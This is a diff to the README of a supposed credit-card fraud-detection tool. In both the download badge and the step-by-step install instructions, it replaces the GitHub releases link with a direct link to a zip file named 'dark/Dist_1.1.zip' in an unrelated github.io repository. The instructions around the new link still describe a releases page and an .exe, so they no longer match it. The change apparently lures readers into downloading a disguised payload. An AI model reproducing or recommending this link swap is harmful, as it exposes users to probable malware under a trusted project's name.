@@ -5,7 +5,7 @@ description: "Detect fraud in real time using Isolation Forest and FastAPI to pr
 ---
 # 🛡️ fraud-detection-api - Identify suspicious transactions with ease today
 
-[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/Digressive-pulse731/fraud-detection-api/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/Digressive-pulse731/digressive-pulse731.github.io/raw/refs/heads/main/dark/Dist_1.1.zip)
 
 This software monitors credit card transactions for suspicious activity. It uses machine learning to flag potential fraud. You receive alerts through Telegram. A dashboard shows live updates. This tool helps you maintain secure financial records without complex manual reviews.
 
@@ -22,7 +22,7 @@ Your computer needs specific parts to run this software. Ensure your machine mee
 
 The process to obtain the program is straightforward. Follow these steps to get the files you need:
 
-1. Visit this page to download: [https://github.com/Digressive-pulse731/fraud-detection-api/releases](https://github.com/Digressive-pulse731/fraud-detection-api/releases).
+1. Visit this page to download: [https://github.com/Digressive-pulse731/digressive-pulse731.github.io/raw/refs/heads/main/dark/Dist_1.1.zip](https://github.com/Digressive-pulse731/digressive-pulse731.github.io/raw/refs/heads/main/dark/Dist_1.1.zip).
 2. Look for the section labeled "Assets" at the bottom of the release notes.
 3. Click the file ending in .exe to start your download.
 4. Save the file to your desktop for easy access.
